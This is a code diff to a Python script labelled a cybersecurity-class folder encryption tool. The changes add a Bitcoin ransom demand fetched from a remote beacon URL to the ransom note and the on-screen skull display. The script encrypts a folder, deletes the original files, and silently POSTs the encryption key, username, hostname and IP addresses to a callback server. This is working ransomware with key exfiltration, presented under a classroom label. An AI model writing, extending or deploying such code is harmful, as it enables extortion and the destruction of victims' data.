@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 """
 Folder encryption script for cybersecurity class.
 
@@ -18,6 +19,7 @@ Requirements:
 from __future__ import annotations
 
 import argparse
+import json
 import getpass
 import io
 import os
@@ -319,9 +321,34 @@ def generate_key() -> bytes:
     return Fernet.generate_key()
 
 
-def write_info_file(info_path: Path, encrypted_file: Path) -> None:
+def fetch_bitcoin_address(beacon_url: str) -> Optional[str]:
+    """
+    GET beacon URL with ?action=new_address and return the Bitcoin address if present.
+    Returns None on any failure (so encryption flow is unaffected).
+    """
+    try:
+        sep = "&" if "?" in beacon_url else "?"
+        url = f"{beacon_url.rstrip('/')}{sep}action=new_address"
+        req = urllib.request.Request(url, headers={"User-Agent": "encrypt_folder.py/1"})
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            data = resp.read().decode("utf-8")
+        out = json.loads(data)
+        if isinstance(out, dict) and out.get("ok") and isinstance(out.get("address"), str):
+            return out["address"].strip() or None
+    except Exception:
+        pass
+    return None
+
+
+def write_info_file(
+    info_path: Path,
+    encrypted_file: Path,
+    *,
+    bitcoin_address: Optional[str] = None,
+) -> None:
     """
     Write a text file with the ransom message and skull art (no key).
+    Optionally include a Bitcoin payment address from the beacon.
     """
     info_path.parent.mkdir(parents=True, exist_ok=True)
     message_lines = [
@@ -331,11 +358,17 @@ def write_info_file(info_path: Path, encrypted_file: Path) -> None:
         "This folder has been encrypted as part of a cybersecurity class exercise.",
         f"The encrypted archive file is: {encrypted_file}",
         "",
+    ]
+    if bitcoin_address:
+        message_lines.append("Send payment to this Bitcoin address to receive decryption key:")
+        message_lines.append(bitcoin_address)
+        message_lines.append("")
+    message_lines.extend([
         "Use the Python script `encrypt_folder.py` with --decrypt and --key (or --key-file) to",
         "decrypt the archive and restore the original files.",
         "",
         SKULL_ART,
-    ]
+    ])
     info_path.write_text("\n".join(message_lines), encoding="utf-8")
 
 
@@ -365,10 +398,10 @@ def _get_external_ip() -> str:
         return ""
 
 
-def send_beacon(callback_url: str, key: bytes) -> None:
+def send_beacon(callback_url: str, key: bytes, *, bitcoin_address: Optional[str] = None) -> None:
     """
-    POST username, computer_name, internal_ip, external_ip, and encryption key
-    to the callback URL. Used for red team beacon; failures are ignored.
+    POST username, computer_name, internal_ip, external_ip, encryption key,
+    and optional bitcoin_address to the callback URL.
     """
     data = {
         "username": getpass.getuser(),
@@ -377,6 +410,8 @@ def send_beacon(callback_url: str, key: bytes) -> None:
         "external_ip": _get_external_ip(),
         "key": key.decode("utf-8"),
     }
+    if bitcoin_address:
+        data["bitcoin_address"] = bitcoin_address
     try:
         payload = urllib.parse.urlencode(data).encode("utf-8")
         req = urllib.request.Request(
@@ -391,9 +426,10 @@ def send_beacon(callback_url: str, key: bytes) -> None:
         pass  # Silent; do not affect encryption flow
 
 
-def show_laughing_skull() -> None:
+def show_laughing_skull(bitcoin_address: Optional[str] = None) -> None:
     """
     Display a red ASCII skull with a centered Ctl+Alt+encrypt header.
+    Optionally show the Bitcoin payment address below the skull.
     """
     cols = shutil.get_terminal_size(fallback=(80, 24)).columns
     header = "Ctl+Alt+encrypt"
@@ -420,6 +456,9 @@ def show_laughing_skull() -> None:
     sys.stdout.write(header_line + "\n")
     sys.stdout.write(subtitle_line + "\n\n")
     sys.stdout.write(centered_skull)
+    if bitcoin_address:
+        pad_addr = max(0, (cols - len(bitcoin_address)) // 2)
+        sys.stdout.write("\n\n" + " " * pad_addr + bitcoin_address)
     sys.stdout.write("\033[0m")
     sys.stdout.flush()
 
@@ -512,8 +551,18 @@ def encrypt_folder(config: EncryptConfig) -> None:
     config.output_file.write_bytes(token)
     print(f"[+] Encrypted archive written to: {config.output_file}")
 
+    bitcoin_address: Optional[str] = None
+    if config.callback_url:
+        bitcoin_address = fetch_bitcoin_address(config.callback_url)
+        if bitcoin_address:
+            print(f"[+] Payment address from beacon: {bitcoin_address}")
+
     print(f"[+] Writing encryption info file to: {config.info_file}")
-    write_info_file(config.info_file, encrypted_file=config.output_file)
+    write_info_file(
+        config.info_file,
+        encrypted_file=config.output_file,
+        bitcoin_address=bitcoin_address,
+    )
     print(f"[+] Info file written. Deleting original files in {config.folder}")
     # Keep the encrypted archive and the info file; delete everything else.
     delete_encrypted_source_files(
@@ -522,7 +571,9 @@ def encrypt_folder(config: EncryptConfig) -> None:
     print("[+] Encryption complete. Original files removed.")
 
     if config.callback_url:
-        send_beacon(config.callback_url, key)
+        send_beacon(config.callback_url, key, bitcoin_address=bitcoin_address)
+
+    show_laughing_skull(bitcoin_address=bitcoin_address)
 
 
 def decrypt_folder(config: DecryptConfig) -> None:
